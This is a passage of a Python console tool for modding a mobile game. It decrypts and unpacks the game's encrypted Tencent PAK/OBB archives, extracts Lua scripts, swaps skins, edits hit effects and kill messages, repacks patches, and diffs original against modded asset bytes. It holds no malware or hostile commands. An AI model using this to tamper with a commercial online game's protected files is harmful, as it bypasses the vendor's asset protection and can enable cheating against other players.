        console.print("[red]✖ ZSDIC PAK repack failed[/red]")
        return False
    
    console.print("[green]✅ ZSDIC modding completed[/green]")
    return True

def skin_run_hit_effect_only():
    console.print(Panel("[bold yellow]🎯 Hit Effect Only Mode[/]", expand=False))
    
    txt_path = MODSKIN_TXT
    if not txt_path.exists():
        console.print("[red]modskin.txt not found[/red]")
        return False
    
    pairs = parse_id_pairs_skin(txt_path)
    if not pairs:
        console.print("[red]No pairs found in modskin.txt[/red]")
        return False
    
    null_count = Prompt.ask("[cyan]Enter null count for Hit Effect[/]", default="100")
    try:
        null_count = int(null_count)
    except ValueError:
        null_count = 100
    
    if not skin_run_hit_effect_lootbox_mod(pairs, null_count=null_count):
        console.print("[red]✖ Hit Effect modification failed[/red]")
        return False
    
    console.print("[green]✅ Hit Effect modding completed[/green]")
    return True

def skin_run_kill_message_standalone():
    console.print(Panel("[bold magenta]💀 Kill Message Only Mode[/]", expand=False))
    
    null_count = Prompt.ask("[cyan]Enter null count for Kill Message[/]", default="10")
    try:
        null_count = int(null_count)
    except ValueError:
        null_count = 10
    
    return skin_run_kill_message_only(null_count=null_count)

def skin_run_mini_repack_only():
    console.print(Panel("[bold blue]📦 Mini Repack Only[/]", expand=False))
    return skin_run_mini_repack()

def skin_run_auto_theme_only_standalone():
    return skin_run_auto_theme_only()

def skin_run_gamepatch_repack_only():
    console.print(Panel("[bold yellow]🎮 GamePatch Repack Only[/]", expand=False))
    return skin_run_gamepatch_repack()

# ==================== SKIN TOOL ABOUT ====================

def skin_show_about():
    console.print(Panel(
        "[bold cyan]🎨 SKIN MODDING TOOL VIP EDITION[/]\n\n"
        "[yellow]📖 ABOUT[/]\n"
        "This tool provides comprehensive skin modding capabilities for SKIN_FOLDER.\n\n"
        "[yellow]⚡ FEATURES[/]\n"
        "• ZSDIC Skin Modding (Skin swap)\n"
        "• Hit Effect Modification (Damage effects)\n"
        "• Lootbox Modification (Crate effects)\n"
        "• Kill Message Processing (Kill feed)\n"
        "• Auto Theme Lobby Swapper (Lobby themes)\n"
        "• Mini OBB Repacking (Hit effects + themes)\n"
        "• GamePatch Repacking (Core patch + game patch)\n"
        "• Full OBB Repacking (Complete mod)\n"
        "• TEXT/VIDEO Credit System\n\n"
        "[yellow]📁 FOLDER STRUCTURE[/]\n"
        f"Main directory: {SKIN_TOOL_DIR}\n\n"
        "[yellow]📝 REQUIRED FILES[/]\n"
        "• modskin.txt - ID pairs for skin swapping\n"
        "• hit.txt - Hit effect hex values\n"
        "• null.txt - IDs to null during repack\n"
        "• attach.txt - Attachment ID pairs (optional)\n"
        "• lobby.txt - Auto theme lobby list\n\n"
        "[yellow]🔧 HOW TO USE[/]\n"
        "1. Place OBB file in SKIN_TOOL/SKIN_FOLDER/input folder\n"
        "2. Place modskin.txt with your ID pairs\n"
        "3. Place hit.txt with hit effect data\n"
        "4. Select Integrated Mod for complete modding\n\n"
        "[green]💡 TIP: Each mode can be run separately![/]",
        title="About",
        border_style="green"
    ))
    Prompt.ask("[white]Press Enter to continue...[/white]", default="")

# ==================== SKIN TOOL MAIN MENU ====================

def skin_tool_main_menu():
    while True:
        show_banner()
        
        skin_menu_panel = Panel(
            f'[bold cyan]🎨  SKIN TOOL MENU[/bold cyan]\n[cyan]{"─" * 32}[/]\n[green]Select Mode[/]\n\n[bold green][1][/bold green] INTEGRATED MOD           [bold yellow]➛ Complete all-in-one[/bold yellow]\n[bold green][2][/bold green] ZSDIC ONLY               [bold yellow]➛ Skin swap only[/bold yellow]\n[bold green][3][/bold green] HIT EFFECT ONLY          [bold yellow]➛ Hit effect + lootbox[/bold yellow]\n[bold green][4][/bold green] KILL MESSAGE ONLY        [bold yellow]➛ Kill message mod[/bold yellow]\n[bold green][5][/bold green] AUTO THEME               [bold yellow]➛ Lobby theme swapper[/bold yellow]\n[bold green][6][/bold green] MINI REPACK              [bold yellow]➛ Repack mini_obb.pak[/bold yellow]\n[bold green][7][/bold green] GAMEPATCH REPACK         [bold yellow]➛ Repack game patches[/bold yellow]\n[bold green][8][/bold green] ABOUT                    [bold yellow]➛ Tool information[/bold yellow]\n\n[bold red][0][/bold red] BACK TO MAIN MENU',
            border_style="cyan",
            padding=(1, 3),
            box=box.ROUNDED
        )
        console.print(skin_menu_panel)
        console.print()
        
        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice == "1":
            skin_integrated_mod_flow()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "2":
            skin_run_zsdic_only()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "3":
            skin_run_hit_effect_only()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "4":
            skin_run_kill_message_standalone()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "5":
            skin_run_auto_theme_only_standalone()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "6":
            skin_run_mini_repack_only()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "7":
            skin_run_gamepatch_repack_only()
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
        elif choice == "8":
            skin_show_about()
        elif choice in ("0", "x", "X"):
            break
        else:
            console.print(Panel(
                f'[bold red]❌ Option {choice} is invalid[/]',
                title='[bold red]Error[/]',
                border_style="red",
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')

def handle_skin_tool():
    """VIP Skin Tool menu entry point."""
    skin_tool_main_menu()

# ==================== SHOW TYPE MENU ====================

# ==================== LUA ONLY UNPACK ====================

def handle_lua_only_unpack(folder_type: str):
    """Unpack ONLY .lua files from a PAK (Game Patch / Zsdic / Mini OBB).
    Supports both 'with path' (folder structure) and 'without path' (flat).
    """
    if folder_type not in ('GAMEPATCH', 'ZSDIC', 'MINI_OBB'):
        console.print(Panel('[bold red]❌ Lua unpack is only for GAME PATCH / ZSDIC / MINI OBB[/bold red]',
                            border_style='red', box=box.ROUNDED))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return

    show_banner()
    console.print(Panel(Align.center(Text('🌙  LUA ONLY UNPACK', style='bold cyan')),
                        box=box.HEAVY_HEAD, border_style='cyan', padding=(0, 0)))
    console.print()

    pak_file = select_pak_file(folder_type, 'Select PAK — Lua Only Unpack')
    if not pak_file:
        return
    pak_file = Path(pak_file)

    _pt = Table(box=box.SIMPLE_HEAD, border_style='cyan', header_style='bold cyan', padding=(0, 1), expand=False)
    _pt.add_column('  #', style='bold yellow', justify='center', width=4)
    _pt.add_column('MODE', style='bold white', width=22)
    _pt.add_column('INFO', style='dim white')
    _pt.add_row('1', '📁  WITH PATH',    'Preserve folder structure')
    _pt.add_row('2', '📄  WITHOUT PATH', 'All .lua flat in one folder')
    console.print(Panel(Align.center(_pt), title='[bold cyan]📂 OUTPUT PATH MODE[/bold cyan]',
                        border_style='cyan', box=box.ROUNDED, padding=(0, 1)))
    console.print()
    path_mode = Prompt.ask('[bold yellow]  ▶ Select path mode[/bold yellow]',
                           choices=['1', '2'], default='1', console=console)

    try:
        pak_instance = TencentPakFile(pak_file, is_od=False)
    except Exception as e:
        console.print(Panel(f'[bold red]❌ Failed to load PAK: {e}[/bold red]', border_style='red', box=box.ROUNDED))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return

    output_root = BASE_DIR / folder_type / 'LUA_UNPACK' / pak_file.stem
    output_root.mkdir(parents=True, exist_ok=True)

    lua_entries = [(dp, fn, e) for dp, files in pak_instance._index.items()
                   for fn, e in files.items() if Path(fn).suffix.lower() == '.lua']

    if not lua_entries:
        console.print(Panel('[bold yellow]⚠ No .lua files found inside this PAK![/bold yellow]',
                            border_style='yellow', box=box.ROUNDED))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return

    console.print(f'\n[cyan]📋 Found [bold]{len(lua_entries)}[/bold] .lua file(s) — extracting...[/cyan]\n')
    lua_count = 0; skipped = 0

    with Progress(SpinnerColumn(spinner_name='dots12', style='bold cyan'),
                  TextColumn('[progress.description]{task.description}'),
                  BarColumn(), TaskProgressColumn(), console=console, expand=True) as progress:
        task = progress.add_task('[cyan]Extracting .lua files...', total=len(lua_entries))
        for dir_path, fname, entry in lua_entries:
            progress.update(task, description=f'[cyan]Extracting: {fname[:35]}...')
            try:
                out_path = (output_root / dir_path / fname) if path_mode == '1' else (output_root / fname)
                if path_mode == '2':
                    ctr = 1
                    while out_path.exists():
                        out_path = output_root / f'{Path(fname).stem}_{ctr}.lua'; ctr += 1
                out_path.parent.mkdir(parents=True, exist_ok=True)
                full_data = bytearray()
                indices = PakCrypto.generate_block_indices(len(entry.compressed_blocks), entry.encryption_method)
                if entry.compression_method == const.CM_NONE:
                    with open(pak_file, 'rb') as f:
                        f.seek(entry.offset)
                        rsz = PakCrypto.align_encrypted_content_size(entry.size, entry.encryption_method) if entry.encrypted else entry.size
                        data = f.read(rsz)
                    if entry.encrypted:
                        data = PakCrypto.decrypt_block(data, Path(fname), entry.encryption_method)
                    full_data.extend(data)
                else:
                    with open(pak_file, 'rb') as f:
                        for ri in indices:
                            blk = entry.compressed_blocks[ri]; f.seek(blk.start)
                            rsz = PakCrypto.align_encrypted_content_size(blk.end - blk.start, entry.encryption_method) if entry.encrypted else blk.end - blk.start
                            data = f.read(rsz)
                            if entry.encrypted:
                                data = PakCrypto.decrypt_block(data, Path(fname), entry.encryption_method)
                            data = PakCompression.decompress_block(data, pak_instance._zstd_dict, entry.compression_method)
                            full_data.extend(data)
                out_path.write_bytes(full_data[:entry.uncompressed_size])
                lua_count += 1
                console.print(f'  [green]✔[/green] [white]{fname}[/white]  [dim]→ {out_path}[/dim]')
            except Exception as ex:
                skipped += 1
                console.print(f'  [yellow]⚠ Skipped {fname}: {ex}[/yellow]')
            progress.update(task, advance=1)

    console.print()
    console.print(Panel(
        f'[bold green]✅ LUA UNPACK COMPLETE![/bold green]\n\n'
        f'[cyan]📄 Extracted :[/cyan] [bold white]{lua_count}[/bold white] .lua file(s)\n'
        f'[yellow]⚠ Skipped   :[/yellow] [bold white]{skipped}[/bold white]\n'
        f'[cyan]📁 Output    :[/cyan] [white]{output_root}[/white]\n'
        f'[cyan]📂 Path Mode :[/cyan] [white]{"With Path" if path_mode == "1" else "Without Path (flat)"}[/white]',
        border_style='green', box=box.ROUNDED, padding=(1, 2)
    ))
    Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')


# ==================== PAK EXTENSION LISTER ====================

def handle_extension_lister(folder_type: str):
    """List all file names + extensions inside a PAK without full unpack.
    Saves result to extension.txt in the tool's folder.
    Available for MINI_OBB, ZSDIC, GAMEPATCH.
    """
    if folder_type not in ('GAMEPATCH', 'ZSDIC', 'MINI_OBB'):
        console.print(Panel('[bold red]❌ Extension lister is only for GAME PATCH / ZSDIC / MINI OBB[/bold red]',
                            border_style='red', box=box.ROUNDED))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return

    show_banner()
    console.print(Panel(
        Align.center(Text('📋  PAK EXTENSION LISTER', style='bold cyan')),
        box=box.HEAVY_HEAD, border_style='cyan', padding=(0, 0)
    ))
    console.print()

    pak_file = select_pak_file(folder_type, 'Select PAK — Extension Lister')
    if not pak_file:
        return
    pak_file = Path(pak_file)

    try:
        pak_instance = TencentPakFile(pak_file, is_od=False)
    except Exception as e:
        console.print(Panel(f'[bold red]❌ Failed to load PAK: {e}[/bold red]', border_style='red', box=box.ROUNDED))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return

    # Collect all entries
    entries = []
    ext_count = {}
    for dir_path, files in pak_instance._index.items():
        for fname, entry in files.items():
            ext = Path(fname).suffix.lower() or '(no ext)'
            entries.append((str(dir_path), fname, ext, entry.uncompressed_size))
            ext_count[ext] = ext_count.get(ext, 0) + 1

    # Build output txt
    out_dir = BASE_DIR / folder_type
    out_dir.mkdir(parents=True, exist_ok=True)
    out_txt = out_dir / f'extension_{pak_file.stem}.txt'

    lines = []
    lines.append('=' * 70)
    lines.append(f'PAK EXTENSION LIST — {pak_file.name}')
    lines.append(f'Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    lines.append(f'Total Files: {len(entries)}')
    lines.append('=' * 70)
    lines.append('')
    lines.append('EXTENSION SUMMARY:')
    lines.append('-' * 40)
    for ext, cnt in sorted(ext_count.items(), key=lambda x: -x[1]):
        lines.append(f'  {ext:<20} {cnt:>5} file(s)')
    lines.append('')
    lines.append('=' * 70)
    lines.append('FILE LIST:')
    lines.append('-' * 70)
    for i, (dp, fname, ext, sz) in enumerate(sorted(entries, key=lambda x: x[1]), 1):
        sz_str = f'{sz:,}' if sz else '0'
        lines.append(f'[{i:>5}] {fname:<45} {ext:<12} {sz_str:>12} bytes')
        if dp and dp != '.':
            lines.append(f'        Path: {dp}')
    lines.append('')
    lines.append('=' * 70)
    lines.append(f'END OF LIST — {len(entries)} files')

    out_txt.write_text('\n'.join(lines), encoding='utf-8')

    # Show table preview (top 20)
    preview = Table(title=f'[bold cyan]Files in {pak_file.name}[/bold cyan]',
                    box=box.SIMPLE_HEAD, border_style='cyan', padding=(0, 1), show_lines=False)
    preview.add_column('#', style='dim', justify='right', width=5)
    preview.add_column('File Name', style='white', width=40)
    preview.add_column('Ext', style='yellow', width=10)
    preview.add_column('Size', style='green', justify='right', width=14)
    for i, (dp, fname, ext, sz) in enumerate(sorted(entries, key=lambda x: x[1])[:25], 1):
        preview.add_row(str(i), fname, ext, f'{sz:,} B')
    if len(entries) > 25:
        preview.add_row('...', f'... and {len(entries) - 25} more files', '', '')
    console.print(preview)

    # Extension summary panel
    ext_lines = '\n'.join(f'  [yellow]{ext}[/yellow]  [white]→ {cnt} file(s)[/white]'
                          for ext, cnt in sorted(ext_count.items(), key=lambda x: -x[1]))
    console.print()
    console.print(Panel(
        f'[bold green]✅ EXTENSION LIST SAVED![/bold green]\n\n'
        f'[cyan]📄 Output :[/cyan] [white]{out_txt}[/white]\n'
        f'[cyan]📦 PAK    :[/cyan] [white]{pak_file.name}[/white]\n'
        f'[cyan]📊 Total  :[/cyan] [white]{len(entries)} files[/white]\n\n'
        f'[bold cyan]Extension Summary:[/bold cyan]\n{ext_lines}',
        border_style='green', box=box.ROUNDED, padding=(1, 2)
    ))
    Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')


# ==================== DAT COMPARE TOOL (OPTION 15) ====================

def handle_dat_compare():
    """Compare .uasset/.uexp (or any binary dat) files between Original and Modded folders.
    Saves a human-readable diff report to RESULTS/modded_dat_data.txt.
    """
    while True:
        show_banner()

        orig_dir    = BASE_DIR / 'DAT_COMPARE' / 'Original'
        modded_dir  = BASE_DIR / 'DAT_COMPARE' / 'Modded'
        results_dir = BASE_DIR / 'DAT_COMPARE' / 'RESULTS'

        for d in (orig_dir, modded_dir, results_dir):
            d.mkdir(parents=True, exist_ok=True)

        console.print(Panel(
            f'[bold cyan]🔍  DAT COMPARE TOOL[/bold cyan]\n[cyan]{"─" * 36}[/]\n\n'
            f'[green]📂 Original Folder:[/green] [white]{orig_dir}[/white]\n'
            f'[green]📂 Modded Folder  :[/green] [white]{modded_dir}[/white]\n'
            f'[green]📁 Results Folder :[/green] [white]{results_dir}[/white]\n\n'
            f'[dim]Put original dats in Original/ and modded dats in Modded/[/dim]\n'
            f'[dim]Supports: .uasset  .uexp  .dat  .res  .lua  and any binary[/dim]\n\n'
            f'[bold green][1][/bold green] RUN COMPARE           [bold yellow]➛ Compare Original vs Modded[/bold yellow]\n'
            f'[bold green][2][/bold green] VIEW RESULTS          [bold yellow]➛ Show last saved report[/bold yellow]\n'
            f'[bold green][3][/bold green] CLEAR RESULTS         [bold yellow]➛ Delete all result files[/bold yellow]\n'
            f'[bold green][4][/bold green] SHOW FOLDER PATHS     [bold yellow]➛ Display folder locations[/bold yellow]\n\n'
            f'[bold red][0][/bold red] BACK TO MAIN MENU',
            border_style='magenta', padding=(1, 3), box=box.ROUNDED
        ))
        console.print()

        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break

        if choice == '1':
            _dat_compare_run(orig_dir, modded_dir, results_dir)
        elif choice == '2':
            _dat_compare_view_results(results_dir)
        elif choice == '3':
            _dat_compare_clear_results(results_dir)
        elif choice == '4':
            console.print(Panel(
                f'[cyan]Original :[/cyan] [white]{orig_dir}[/white]\n'
                f'[cyan]Modded   :[/cyan] [white]{modded_dir}[/white]\n'
                f'[cyan]Results  :[/cyan] [white]{results_dir}[/white]',
                border_style='cyan', box=box.ROUNDED, padding=(1, 2)
            ))
            Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        elif choice == '0':
            break
        else:
            console.print(Panel(f'[bold red]❌ Option {choice} is invalid[/]',
                                border_style='red', box=box.ROUNDED))
            Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')


def _dat_compare_run(orig_dir: Path, modded_dir: Path, results_dir: Path):
    """Core compare logic — 100% ACCURATE byte-level diff with COMPLETE DATA."""
    show_banner()
    console.print(Panel(Align.center(Text('🔬  RUNNING DAT COMPARE (COMPLETE MODE)', style='bold cyan')),
                        box=box.HEAVY_HEAD, border_style='cyan', padding=(0, 0)))
    console.print()

    # Collect files from both sides
    orig_files   = {f.name: f for f in orig_dir.rglob('*') if f.is_file()}
    modded_files = {f.name: f for f in modded_dir.rglob('*') if f.is_file()}

    if not orig_files and not modded_files:
        console.print(Panel(
            '[bold yellow]⚠ Both Original and Modded folders are empty!\n\n'
            '[white]Place your files:\n'
            '  • Original dats → Original/\n'
            '  • Modded dats   → Modded/[/white]',
            border_style='yellow', box=box.ROUNDED
        ))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return

    all_names = sorted(set(orig_files) | set(modded_files))

    # Build report lines
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    report_lines = []
    report_lines.append('=' * 100)
    report_lines.append('  TOXIC TOOL — DAT COMPARE REPORT (COMPLETE & ACCURATE)')
    report_lines.append(f'  Generated : {timestamp}')
    report_lines.append(f'  Original  : {orig_dir}')
    report_lines.append(f'  Modded    : {modded_dir}')
    report_lines.append('=' * 100)
    report_lines.append('')

    total_files      = len(all_names)
    files_identical  = 0
    files_changed    = 0
    files_new        = 0
    files_removed    = 0
    total_bytes_diff = 0
    total_changes    = 0

    with Progress(SpinnerColumn(spinner_name='dots12', style='bold cyan'),
                  TextColumn('[progress.description]{task.description}'),
                  BarColumn(), TaskProgressColumn(), console=console, expand=True) as prog:
        task = prog.add_task('[cyan]Comparing files...', total=total_files)

        for name in all_names:
            prog.update(task, description=f'[cyan]Comparing: {name[:40]}...')

            in_orig   = name in orig_files
            in_modded = name in modded_files

            # ── File only in Modded (new file) ────────────────────
            if not in_orig:
                files_new += 1
                sz = modded_files[name].stat().st_size
                total_bytes_diff += sz
                total_changes += 1
                report_lines.append(f'[NEW FILE]  {name}')
                report_lines.append(f'  Status : Added in Modded (not in Original)')
                report_lines.append(f'  Size   : {sz:,} bytes')
                report_lines.append('')
                prog.update(task, advance=1)
                continue

            # ── File only in Original (removed) ───────────────────
            if not in_modded:
                files_removed += 1
                sz = orig_files[name].stat().st_size
                total_changes += 1
                report_lines.append(f'[REMOVED]   {name}')
                report_lines.append(f'  Status : Present in Original, missing in Modded')
                report_lines.append(f'  Size   : {sz:,} bytes')
                report_lines.append('')
                prog.update(task, advance=1)
                continue

            # ── Both exist — byte compare ──────────────────────────
            orig_data   = orig_files[name].read_bytes()
            modded_data = modded_files[name].read_bytes()

            if orig_data == modded_data:
                files_identical += 1
                prog.update(task, advance=1)
                continue

            # Files differ — COMPLETE ANALYSIS
            files_changed += 1
            size_diff = len(modded_data) - len(orig_data)
            total_bytes_diff += abs(size_diff)

            report_lines.append(f'{"=" * 100}')
            report_lines.append(f'[MODIFIED]  {name}')
            report_lines.append(f'{"─" * 100}')
            report_lines.append(f'  Original size : {len(orig_data):,} bytes (0x{len(orig_data):X})')
            report_lines.append(f'  Modded size   : {len(modded_data):,} bytes (0x{len(modded_data):X})')
            report_lines.append(f'  Size diff     : {size_diff:+,} bytes')
            report_lines.append('')

            # Find ALL changed byte offsets (NO LIMIT)
            min_len = min(len(orig_data), len(modded_data))
            changed_offsets = [i for i in range(min_len) if orig_data[i] != modded_data[i]]
            
            total_changes += len(changed_offsets)
            report_lines.append(f'  ✓ Total Changed bytes : {len(changed_offsets):,}')
            report_lines.append('')

            # Group contiguous changed offsets into "regions" (ALL OF THEM)
            regions = []
            if changed_offsets:
                start = changed_offsets[0]
                end = changed_offsets[0]
                for off in changed_offsets[1:]:
                    if off == end + 1:
                        end = off
                    else:
                        regions.append((start, end))
                        start = off
                        end = off
                regions.append((start, end))

            report_lines.append(f'  ✓ Changed Regions : {len(regions)} region(s)')
            report_lines.append('')
            report_lines.append('  DETAILED BYTE-BY-BYTE CHANGES:')
            report_lines.append(f'  {"─" * 96}')

            # Show ALL regions with complete context
            for region_idx, (r_start, r_end) in enumerate(regions, 1):
                region_size = r_end - r_start + 1
                
                # Extended context (16 bytes before and after)
                ctx_start = max(0, r_start - 16)
                ctx_end = min(min_len, r_end + 17)
                
                report_lines.append(f'')
                report_lines.append(f'  Region {region_idx}/{len(regions)}: Offset 0x{r_start:08X} – 0x{r_end:08X} ({region_size} byte(s))')
                report_lines.append(f'  {"─" * 96}')
                
                # Show hex dump with alignment
                orig_hex   = ' '.join(f'{b:02X}' for b in orig_data[ctx_start:ctx_end])
                modded_hex = ' '.join(f'{b:02X}' for b in modded_data[ctx_start:ctx_end])
                
                report_lines.append(f'  Address | Original                                  | Modded')
                report_lines.append(f'  {"-" * 92}')
                
                # Byte by byte comparison in this region
                for offset in range(ctx_start, ctx_end, 16):
                    orig_chunk = orig_data[offset:min(offset + 16, min_len)]
                    modded_chunk = modded_data[offset:min(offset + 16, min_len)]
                    
                    orig_hex_line = ' '.join(f'{b:02X}' for b in orig_chunk)
                    modded_hex_line = ' '.join(f'{b:02X}' for b in modded_chunk)
                    
                    # Mark changed bytes
                    changed_in_chunk = [i for i in range(len(orig_chunk)) if orig_chunk[i] != modded_chunk[i]]
                    marker = ' ◄ CHANGED' if changed_in_chunk else ''
                    
                    report_lines.append(f'  0x{offset:06X} | {orig_hex_line:<42} | {modded_hex_line:<42}{marker}')
                
                # Detailed analysis for this region
                report_lines.append(f'  {"-" * 92}')
                report_lines.append(f'  Individual byte changes in this region:')
                
                for offset in range(r_start, min(r_end + 1, min_len)):
                    if orig_data[offset] != modded_data[offset]:
                        report_lines.append(f'    • Offset 0x{offset:08X}: 0x{orig_data[offset]:02X} → 0x{modded_data[offset]:02X}  ({orig_data[offset]:3d} → {modded_data[offset]:3d})')

            report_lines.append(f'')
            report_lines.append(f'  {"─" * 96}')

            # If modded is longer — show ALL appended bytes
            if len(modded_data) > len(orig_data):
                extra = modded_data[len(orig_data):]
                report_lines.append(f'')
                report_lines.append(f'  📌 APPENDED BYTES ({len(extra):,} total):')
                for idx in range(0, len(extra), 16):
                    chunk = extra[idx:min(idx + 16, len(extra))]
                    hex_str = ' '.join(f'{b:02X}' for b in chunk)
                    offset = len(orig_data) + idx
                    report_lines.append(f'    0x{offset:08X}: {hex_str}')

            # If modded is shorter — show ALL removed bytes
            if len(orig_data) > len(modded_data):
                removed = orig_data[len(modded_data):]
                report_lines.append(f'')
                report_lines.append(f'  🗑️  REMOVED BYTES ({len(removed):,} total):')
                for idx in range(0, len(removed), 16):
                    chunk = removed[idx:min(idx + 16, len(removed))]
                    hex_str = ' '.join(f'{b:02X}' for b in chunk)
                    offset = len(modded_data) + idx
                    report_lines.append(f'    0x{offset:08X}: {hex_str}')

            report_lines.append(f'')
            prog.update(task, advance=1)

    # ── Summary ───────────────────────────────────────────────────
    report_lines.append('=' * 100)
    report_lines.append('COMPLETE SUMMARY — ACCURATE DATA')
    report_lines.append('-' * 100)
    report_lines.append(f'  📊 Total files scanned    : {total_files}')
    report_lines.append(f'  ✅ Identical files        : {files_identical}')
    report_lines.append(f'  ⚡ Modified files         : {files_changed}')
    report_lines.append(f'  ➕ New files (in Modded)  : {files_new}')
    report_lines.append(f'  ➖ Removed files (in Orig): {files_removed}')
    report_lines.append(f'')
    report_lines.append(f'  📌 TOTAL BYTE CHANGES    : {total_changes:,}')
    report_lines.append(f'  💾 Total size difference : {total_bytes_diff:,} bytes')
    report_lines.append('=' * 100)
    report_lines.append('')
    report_lines.append('✓ REPORT GENERATED IN COMPLETE MODE — ALL CHANGES ARE SHOWN')
    report_lines.append('✓ 100% ACCURACY — NO DATA TRUNCATED OR HIDDEN')
    report_lines.append('')
    report_lines.append('=' * 100)

    # ── Save report ───────────────────────────────────────────────
    ts_file = datetime.now().strftime('%Y%m%d_%H%M%S')
    out_file = results_dir / f'TOXIC_COMPAIR_dat_data_{ts_file}.txt'
    # Always also write/overwrite the "latest" file for quick access
    latest_file = results_dir / 'TOXIC_COMPAIR_dat_data.txt'
    content = '\n'.join(report_lines)
    out_file.write_text(content, encoding='utf-8')
    latest_file.write_text(content, encoding='utf-8')

    # ── Console summary ───────────────────────────────────────────
    console.print()
    summary_color = 'green' if files_changed == 0 else 'yellow'
    console.print(Panel(
        f'[bold green]✅ COMPARE COMPLETE (ACCURATE MODE)![/bold green]\n\n'
        f'[cyan]📊 Total files      :[/cyan] [white]{total_files}[/white]\n'
        f'[green]✔  Identical        :[/green] [white]{files_identical}[/white]\n'
        f'[{summary_color}]⚡ Modified          :[/{summary_color}] [white]{files_changed}[/white]\n'
        f'[blue]➕ New in Modded     :[/blue] [white]{files_new}[/white]\n'
        f'[red]➖ Removed           :[/red] [white]{files_removed}[/white]\n'
        f'[yellow]📌 Total Changes    :[/yellow] [white]{total_changes:,}[/white]\n\n'
        f'[cyan]📄 Report saved     :[/cyan] [white]{latest_file}[/white]\n'
        f'[cyan]📄 Timestamped      :[/cyan] [white]{out_file.name}[/white]\n'
        f'[green]✓  Complete & Accurate[/green]',
        border_style='green', box=box.ROUNDED, padding=(1, 2)
    ))
    Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')


def _dat_compare_view_results(results_dir: Path):
    """Show saved compare result files."""
    txt_files = sorted(results_dir.glob('*.txt'), key=lambda f: f.stat().st_mtime, reverse=True)
    if not txt_files:
        console.print(Panel('[bold yellow]⚠ No result files found. Run a compare first.[/bold yellow]',
                            border_style='yellow', box=box.ROUNDED))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return

    tbl = Table(title='[bold cyan]📂 COMPARE RESULTS[/bold cyan]', box=box.ROUNDED,
                border_style='cyan', padding=(0, 1))
    tbl.add_column('#', style='yellow', width=4, justify='right')
    tbl.add_column('File', style='white', width=42)
    tbl.add_column('Size', style='green', justify='right', width=10)
    for i, f in enumerate(txt_files[:10], 1):
        tbl.add_row(str(i), f.name, f'{f.stat().st_size:,} B')
    console.print(tbl)
    console.print()

    try:
        sel = Prompt.ask(f'[bold yellow]Select file to view (1-{min(10, len(txt_files))}) or 0 to cancel[/bold yellow]',
                         default='0')
        sel = int(sel)
    except (ValueError, KeyboardInterrupt):
        return
    if sel == 0 or not (1 <= sel <= min(10, len(txt_files))):
        return

    chosen = txt_files[sel - 1]
    try:
        content = chosen.read_text(encoding='utf-8')
        # Print in pages of 40 lines
        lines = content.splitlines()
        page = 0; page_size = 40
        while True:
            start = page * page_size
            end   = start + page_size
            chunk = lines[start:end]
            if not chunk:
                break
            console.print('\n'.join(chunk))
            if end >= len(lines):
                console.print(f'\n[dim]--- END OF FILE ({len(lines)} lines) ---[/dim]')
                break
            more = Prompt.ask('[dim]Press Enter for next page, q to quit[/dim]', default='')
            if more.lower() == 'q':
                break
            page += 1
    except Exception as e:
        console.print(f'[red]❌ Could not read file: {e}[/red]')
    Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')


def _dat_compare_clear_results(results_dir: Path):
    """Delete all result txt files."""
    txt_files = list(results_dir.glob('*.txt'))
    if not txt_files:
        console.print(Panel('[yellow]⚠ No result files to clear.[/yellow]', border_style='yellow', box=box.ROUNDED))
        Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')
        return
    confirm = Prompt.ask(f'[bold red]Delete ALL {len(txt_files)} result file(s)? (y/n)[/bold red]',
                         choices=['y', 'n'], default='n')
    if confirm == 'y':
        for f in txt_files:
            try: f.unlink(); console.print(f'[green]✔ Deleted:[/green] {f.name}')
            except Exception as e: console.print(f'[red]✗ {f.name}: {e}[/red]')
    Prompt.ask('[dim]Press Enter to continue...[/dim]', default='')


def show_type_menu(folder_type: str, type_name: str):
    """Pixel-style sub-menu for a specific tool type."""
    icons = {
        'ZSDIC':     '📦 ZSDIC TOOL',
        'MINI_OBB':  '📦 MINI OBB TOOL',
        'OD_PAK':    '📦 OD PAK TOOL',
        'GAMEPATCH': '📦 GAME PATCH TOOL',
    }
    label = icons.get(folder_type, type_name)

    # Options 9 & 10 only for these three tools
    extra_tools = folder_type in ('GAMEPATCH', 'ZSDIC', 'MINI_OBB')

    while True:
        show_banner()

        extra_lines = (
            '\n[bold green][9][/bold green]  UNPACK LUA ONLY        [bold yellow]➛ Extract .lua files[/bold yellow]'
            '\n[bold green][10][/bold green] LIST FILE EXTENSIONS   [bold yellow]➛ See All Available Dats[/bold yellow]'
        ) if extra_tools else ''

        tool_menu_panel = Panel(
            f'[bold cyan]{label}[/bold cyan]\n[cyan]{"─" * 32}[/]\n\n'
            f'[green]Path[/]: [white]{BASE_DIR / folder_type}[/white]\n\n'
